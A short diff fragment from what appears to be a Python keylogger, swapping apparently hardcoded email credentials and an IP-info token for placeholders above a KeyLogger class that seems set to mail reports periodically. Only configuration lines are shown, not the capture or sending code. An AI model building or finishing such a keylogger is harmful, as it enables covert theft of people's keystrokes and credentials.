@@ -51,9 +51,9 @@ finally:
 
     atexit.register(cleanup_temp_dir)
 
-    EMAIL_ADDRESS = "408f2b5a1bfe28"
-    EMAIL_PASSWORD = "1b83545fd014d7"
-    IP_INFO_TOKEN = "69a853b9501ab9"
+    EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS_HERE"
+    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD_HERE"
+    IP_INFO_TOKEN = "YOUR_IPINFO_TOKEN_HERE"
     SEND_REPORT_EVERY = 10
 
     class KeyLogger:
